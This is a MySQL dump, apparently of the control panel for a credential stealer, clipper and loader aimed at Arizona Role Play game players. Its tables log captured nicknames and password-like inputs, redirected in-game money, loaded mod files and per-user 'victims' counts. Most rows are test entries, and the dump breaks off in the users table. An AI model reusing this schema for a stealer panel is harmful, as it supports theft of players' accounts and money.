-- MySQL dump 10.13  Distrib 5.7.28, for Linux (x86_64)
--
-- Host: localhost    Database: lokisoft
-- ------------------------------------------------------
-- Server version	5.7.28-0ubuntu0.16.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `clipper`
--

DROP TABLE IF EXISTS `clipper`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `clipper` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `id_base` int(11) NOT NULL,
  `nick_1` varchar(255) NOT NULL,
  `nick_2` varchar(255) NOT NULL,
  `money` int(11) NOT NULL,
  `server` text NOT NULL,
  `ip_user` varchar(255) NOT NULL,
  `date` date NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `clipper`
--

LOCK TABLES `clipper` WRITE;
/*!40000 ALTER TABLE `clipper` DISABLE KEYS */;
INSERT INTO `clipper` VALUES (1,2,'Loki_Lafeyson','Smoke_Devero',1000000,'ARZ 12345.12345.12345','123.123.123.123','2020-01-17'),(2,2,'asd','add',33,'asda313','13','2020-01-18'),(3,2,'asd','asdaa',123,'asda3ss13','133','2020-01-18');
/*!40000 ALTER TABLE `clipper` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `failed_jobs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `failed_jobs`
--

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `loader`
--

DROP TABLE IF EXISTS `loader`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `loader` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `directory_1` varchar(255) NOT NULL,
  `directory_2` varchar(255) NOT NULL,
  `directory_3` varchar(255) NOT NULL,
  `download_1` int(11) NOT NULL,
  `download_2` int(11) NOT NULL,
  `download_3` int(11) NOT NULL,
  `id_base` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `loader`
--

LOCK TABLES `loader` WRITE;
/*!40000 ALTER TABLE `loader` DISABLE KEYS */;
INSERT INTO `loader` VALUES (1,'2hi.asi','sampfuncs/test2.sf','sampfuncs/test.sf',0,0,3,2);
/*!40000 ALTER TABLE `loader` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `logs`
--

DROP TABLE IF EXISTS `logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nick` varchar(255) NOT NULL,
  `input` varchar(255) NOT NULL,
  `server` varchar(255) NOT NULL,
  `dialog` int(11) NOT NULL,
  `ip_user` varchar(255) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `id_base` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=149 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `logs`
--

LOCK TABLES `logs` WRITE;
/*!40000 ALTER TABLE `logs` DISABLE KEYS */;
INSERT INTO `logs` VALUES (5,'Loki_Lafeyson','123456','185.169.134.43:7777 [Arizona Role Play | Scottdale]',2,'123.123.123.123','2020-01-20 01:57:59',2),(6,'Bonik','12331456','185.169.134.43:7777 [Arizona Role Play | Scottdale]',2,'123.123.321.123','2020-01-20 01:58:18',2),(7,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:30',2),(8,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(9,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(10,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(11,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(12,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(13,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:41',2),(14,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(15,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(16,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(17,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(18,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(19,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(20,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(21,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(22,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(23,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(24,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(25,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(26,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(27,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(28,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(29,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(30,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(31,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(32,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(33,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(34,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(35,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(36,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(37,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(38,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(39,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(40,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(41,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(42,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(43,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:42',2),(44,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(45,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(46,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(47,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(48,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(49,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(50,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(51,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(52,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(53,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(54,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(55,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(56,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:43',2),(57,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:01:47',2),(58,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(59,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(60,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(61,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(62,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(63,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(64,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(65,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(66,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(67,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(68,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(69,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:00',2),(70,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(71,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(72,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(73,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(74,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(75,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(76,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(77,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(78,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(79,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(80,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(81,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(82,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(83,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(84,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(85,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(86,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(87,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(88,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(89,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(90,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(91,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(92,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(93,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(94,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(95,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(96,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(97,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:01',2),(98,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(99,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(100,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(101,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(102,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(103,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:02',2),(104,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(105,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(106,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(107,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(108,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(109,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(110,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:21',2),(111,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(112,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(113,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(114,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(115,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(116,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(117,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(118,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(119,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(120,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(121,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(122,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(123,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(124,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(125,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(126,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(127,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(128,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(129,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(130,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(131,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(132,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(133,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:22',2),(134,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(135,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(136,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(137,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(138,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(139,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(140,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(141,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(142,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(143,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(144,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(145,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(146,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(147,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2),(148,'papasmurf','12345','Arizona RP | Ser (151.80.47.186:4003)',2,'123.123.123.123','2020-01-20 02:02:23',2);
/*!40000 ALTER TABLE `logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2014_10_12_000000_create_users_table',1),(2,'2014_10_12_100000_create_password_resets_table',1),(3,'2018_06_28_174250_create_messages_table',1),(4,'2019_07_17_200348_create_category',1),(5,'2019_07_17_200947_create_mod',1),(6,'2019_07_23_132753_create_downloads_table',1),(7,'2019_07_23_133055_create_downloadable_table',1),(8,'2019_08_02_155639_create_comments_table',1),(9,'2019_08_19_000000_create_failed_jobs_table',1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `news` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `news` varchar(255) CHARACTER SET utf8mb4 NOT NULL,
  `description` varchar(255) CHARACTER SET utf8mb4 NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES (1,'Новость 1','Текст 1'),(2,'Новость 2','Текст 2');
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nicks`
--

DROP TABLE IF EXISTS `nicks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nicks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `Phoenix` varchar(255) DEFAULT NULL,
  `Tucson` varchar(255) DEFAULT NULL,
  `Scottdale` varchar(255) DEFAULT NULL,
  `Chandler` varchar(255) DEFAULT NULL,
  `Brainburg` varchar(255) DEFAULT NULL,
  `SaintRose` varchar(255) DEFAULT NULL,
  `Mesa` varchar(255) DEFAULT NULL,
  `RedRock` varchar(255) DEFAULT NULL,
  `Yuma` varchar(255) DEFAULT NULL,
  `Surprise` varchar(255) DEFAULT NULL,
  `Prescott` varchar(255) DEFAULT NULL,
  `id_base` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nicks`
--

LOCK TABLES `nicks` WRITE;
/*!40000 ALTER TABLE `nicks` DISABLE KEYS */;
INSERT INTO `nicks` VALUES (2,'asdfa',NULL,'v','fa',NULL,'sad',NULL,'asd',NULL,NULL,'xzv',2);
/*!40000 ALTER TABLE `nicks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `piar`
--

DROP TABLE IF EXISTS `piar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `piar` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `file` text NOT NULL,
  `base_id` int(11) NOT NULL,
  `status` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `piar`
--

LOCK TABLES `piar` WRITE;
/*!40000 ALTER TABLE `piar` DISABLE KEYS */;
INSERT INTO `piar` VALUES (1,'asd',2,0);
/*!40000 ALTER TABLE `piar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` text COLLATE utf8mb4_unicode_ci,
  `UID` int(11) NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `balance` int(11) NOT NULL DEFAULT '0',
  `clipper` int(11) NOT NULL DEFAULT '0',
  `victims` int(11) NOT NULL DEFAULT '0',
  `stealer` int(11) NOT NULL DEFAULT '0',
  `gluer` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `loader` int(11) NOT NULL DEFAULT '0',
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
